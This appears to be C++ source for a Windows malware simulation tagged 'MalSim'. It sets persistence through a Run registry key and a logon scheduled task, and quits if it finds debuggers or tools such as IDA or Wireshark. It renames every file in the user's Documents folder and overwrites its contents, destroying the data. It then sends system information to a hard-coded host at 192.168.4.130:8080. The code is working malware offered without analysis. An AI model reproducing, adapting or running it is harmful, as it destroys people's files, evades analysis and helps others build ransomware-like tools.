#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tchar.h>
#include <fstream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <algorithm>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <winternl.h> // Include this for NTSTATUS and PROCESSINFOCLASS
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

// Define the NtQueryInformationProcess function pointer type globally
typedef NTSTATUS(WINAPI* NtQueryInformationProcessFunc)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

// NtQueryInformationProcessFunc NtQIP = NULL;

// Check if any decompiler tools are installed
bool isDebuggingToolInstalled() {
    // List of possible decompiler tool names
    std::vector<std::string> targets = { "IDA", "x32dbg", "x32dbg", "wireshark" };

    for (const auto& target : targets) {
        // Use system command to check if the specified decompiler tool is running
        std::string command = "tasklist | findstr " + target;
        if (system(command.c_str()) == 0) {
            return true;
        }
    }
    return false;
}

// Check if the process is being debugged
bool isBeingDebugged() {
    // Use Windows API function to detect if the current process is being debugged
    return IsDebuggerPresent();
}

// Check for debugger presence using NtQueryInformationProcess
bool checkNtQueryInformationProcess() {
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    return isDebuggerPresent;
}



// Check if the process has debug privileges
bool hasDebugPrivileges() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    // Get the access token of the current process and check for debug privileges
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        CloseHandle(hToken);
        return true;
    }
    return false;
}

// Check if any debugger process is running
bool isDebuggerProcessRunning() {
    // List of common debugger process names
    std::vector<std::wstring> debuggerProcesses = { L"ollydbg.exe", L"wireshark.exe", L"x32dbg.exe", L"x64dbg.exe" };
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    // Create a snapshot of the system to enumerate all processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32FirstW(snapshot, &entry) == TRUE) {
        do {
            // Check if any debugger process is running
            for (const auto& debugger : debuggerProcesses) {
                if (_wcsicmp(entry.szExeFile, debugger.c_str()) == 0) {
                    CloseHandle(snapshot);
                    return true;
                }
            }
        } while (Process32NextW(snapshot, &entry) == TRUE);
    }
    CloseHandle(snapshot);
    return false;
}

// Persistence function (adding a scheduled task)
void setPersistence() {
    wchar_t filePath[MAX_PATH];
    // Get the path of the current executable
    GetModuleFileNameW(NULL, filePath, MAX_PATH);
    HKEY key;
    // Add the program to the registry to run at system startup
    if (RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &key) == ERROR_SUCCESS) {
        RegSetValueExW(key, L"MalSim", 0, REG_SZ, (const BYTE*)filePath, (DWORD)(wcslen(filePath) * sizeof(wchar_t)));
        RegCloseKey(key);
    }

    // Add a scheduled task to ensure the program runs when the user logs in
    std::wstring command = L"schtasks /create /tn \"MST\" /tr \"";
    command += filePath;
    command += L"\" /sc onlogon /rl highest";
    _wsystem(command.c_str());
}

// Rename all files in the specified directory to random numeric names
void renameFilesInDirectory(const std::wstring& directory) {
    WIN32_FIND_DATAW findFileData;
    // Find the first file in the directory
    HANDLE hFind = FindFirstFileW((directory + L"\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    bool isEmpty = true;
    srand((unsigned int)time(NULL));
    std::wstring ipAddress = L"192.168.4.130";  // Example IP address used to encrypt file content
    do {
        const std::wstring fileName = findFileData.cFileName;
        // Exclude current and parent directory entries, and only operate on files
        if (fileName != L"." && fileName != L".." && !(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            isEmpty = false;
            // Generate a random file name
            std::wstring newFileName = std::to_wstring(rand() % 1000000);
            // Rename the file
            MoveFileW((directory + L"\\" + fileName).c_str(), (directory + L"\\" + newFileName).c_str());

            // Create and encrypt new file content
            std::wofstream file(directory + L"\\" + newFileName);
            if (file.is_open()) {
                file << ipAddress;  // Write the IP address to the file (can implement further encryption)
                file.close();
            }
        }
    } while (FindNextFileW(hFind, &findFileData));

    FindClose(hFind);

    // If the directory is empty, create a hidden file
    if (isEmpty) {
        std::wstring hiddenFileName = directory + L"\\" + std::to_wstring(rand() % 1000000) + L".nasco";
        std::wofstream hiddenFile(hiddenFileName);
        if (hiddenFile.is_open()) {
            hiddenFile << ipAddress;  // Write the example IP address
            hiddenFile.close();
        }
        SetFileAttributesW(hiddenFileName.c_str(), FILE_ATTRIBUTE_HIDDEN);  // Set the file as hidden
    }
}

// Get system information
std::wstring getSystemInfo() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    // Collect CPU architecture and number of processors
    std::wstring sysInfo = L"CPU Architecture: " + std::to_wstring(si.wProcessorArchitecture) + L"\n";
    sysInfo += L"Number of Processors: " + std::to_wstring(si.dwNumberOfProcessors) + L"\n";
    return sysInfo;
}

// Send system information to a specified server
void sendSystemInfo(const std::wstring& sysInfo) {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;
    const char* serverIp = "192.168.4.130";
    const int port = 8080;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // Set up the server address and port
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, serverIp, &server.sin_addr);

    // Attempt to connect to the server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Send system information to the server
    std::string sysInfoStr(sysInfo.begin(), sysInfo.end());
    send(sock, sysInfoStr.c_str(), (int)sysInfoStr.size(), 0);
    closesocket(sock);
    WSACleanup();
}

int main() {
    // Set persistence so the program automatically runs at system startup or user login
    setPersistence();

    // Check if any debuggers are running; if so, exit the program
    if (isBeingDebugged() || isDebuggingToolInstalled() || checkNtQueryInformationProcess() || hasDebugPrivileges() || isDebuggerProcessRunning()) {
        return 0; // Debugging tools detected; do not perform any actions
    }

    // Modify file names in the target directory
    wchar_t* userProfile = nullptr;
    size_t len = 0;
    _wdupenv_s(&userProfile, &len, L"USERPROFILE");
    if (userProfile) {
        const std::wstring targetDirectory = std::wstring(userProfile) + L"\\Documents\\";
        free(userProfile);  // Free the memory allocated by _wdupenv_s

        renameFilesInDirectory(targetDirectory);
    }

    // Get system information and send it to the specified server
    std::wstring sysInfo = getSystemInfo();
    sendSystemInfo(sysInfo);

    return 0;
}
